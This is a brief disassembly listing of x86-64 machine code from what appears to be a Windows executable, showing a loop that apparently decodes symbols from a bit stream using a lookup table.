   140004e68:	0f 85 22 ff ff ff    	jne    0x140004d90
   140004e6e:	4c 8b 6d c8          	mov    -0x38(%rbp),%r13
   140004e72:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004e77:	4d 8d 7d fe          	lea    -0x2(%r13),%r15
   140004e7b:	e8 50 c4 ff ff       	call   0x1400012d0
   140004e80:	33 c9                	xor    %ecx,%ecx
   140004e82:	85 c0                	test   %eax,%eax
   140004e84:	0f 94 c1             	sete   %cl
   140004e87:	33 c0                	xor    %eax,%eax
   140004e89:	4d 3b f7             	cmp    %r15,%r14
   140004e8c:	0f 96 c0             	setbe  %al
   140004e8f:	85 c8                	test   %ecx,%eax
   140004e91:	74 57                	je     0x140004eea
   140004e93:	41 8b f4             	mov    %r12d,%esi
   140004e96:	f7 de                	neg    %esi
   140004e98:	83 e6 3f             	and    $0x3f,%esi
   140004e9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ea0:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004ea4:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004ea9:	48 d3 e0             	shl    %cl,%rax
   140004eac:	8b ce                	mov    %esi,%ecx
   140004eae:	48 d3 e8             	shr    %cl,%rax
   140004eb1:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004eb5:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004eba:	66 41 89 06          	mov    %ax,(%r14)
   140004ebe:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004ec2:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004ec6:	0f b6 41 07          	movzbl 0x7(%rcx),%eax
   140004eca:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004ecf:	4c 03 f0             	add    %rax,%r14
   140004ed2:	e8 f9 c3 ff ff       	call   0x1400012d0
   140004ed7:	33 c9                	xor    %ecx,%ecx
   140004ed9:	85 c0                	test   %eax,%eax
   140004edb:	0f 94 c1             	sete   %cl
   140004ede:	33 c0                	xor    %eax,%eax
   140004ee0:	4d 3b f7             	cmp    %r15,%r14
   140004ee3:	0f 96 c0             	setbe  %al
   140004ee6:	85 c8                	test   %ecx,%eax
